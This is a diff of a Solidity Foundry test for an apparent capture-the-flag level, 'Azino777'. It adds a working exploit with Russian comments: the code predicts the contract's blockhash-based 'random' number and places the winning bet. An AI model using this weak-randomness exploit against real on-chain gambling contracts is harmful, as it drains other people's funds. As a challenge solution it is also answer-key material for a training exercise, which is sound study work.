@@ -4,6 +4,9 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/01_Azino777/Azino777.sol";
 
+uint256 constant FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
+// функция rand использует предсказуемые значения (blockhash предыдущего блока) для генерации случайного числа.
+// Можно вычислить и отправить правильную ставку.
 // forge test --match-contract Azino777Test -vvvv
 contract Azino777Test is BaseTest {
     Azino777 instance;
@@ -15,7 +18,12 @@ contract Azino777Test is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 lastBlockNumber = block.number - 1;
+        uint256 hashVal = uint256(blockhash(lastBlockNumber));
+        uint256 factor = (FACTOR * 100) / 100;
+        uint256 predictedNumber = uint256((uint256(hashVal) / factor)) % 100;
+        instance.spin{value: 0.01 ether}(predictedNumber);
+
 
         checkSuccess();
     }
